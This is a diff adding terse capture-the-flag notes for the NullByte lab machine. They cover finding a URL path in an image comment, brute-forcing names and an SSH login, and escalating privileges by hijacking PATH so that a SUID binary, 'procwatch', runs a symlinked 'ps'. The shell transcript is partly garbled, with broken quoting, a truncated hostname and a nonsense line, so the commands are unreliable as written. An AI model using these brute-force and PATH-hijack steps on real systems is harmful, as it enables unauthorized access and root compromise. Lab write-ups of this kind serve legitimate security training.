@@ -1,0 +1,40 @@
+we had a image with comment .. it was path for url
+
+imagine
+
+bruteforceing it we got names
+
+ssh bruteforce got in
+
+suid
+
+on  running that suid bit
+
+
+ramses@NullByte:~$ cd ..
+
+ramses@NullByte: /home$ /var/www/backup/procwatch
+PID TTY TIME CMD
+
+1753 pts/@ 00:00:00 procwatch
+
+1754 pts/@ 00:00:00 sh
+
+1755 pts/@ 00:00:00 ps
+
+ramses@NullByte: /home$ cd /var/www/backup
+ramses@NullByte:/var/www/backup$ ln -s /bin/ls ps
+ramses@NullByte: /var/www/backup$ export PATH='pwd":${PATH}
+ramses@NullByte: /var/www/backup$ ./procwatch
+
+procwatch ps readme.txt
+
+ramses@NullByt:
+ramses@NullByt
+
+var/www/backup$ rm ps
+var/www/badbilt es TRE ar
+
+
+
+so try symlink and it worked
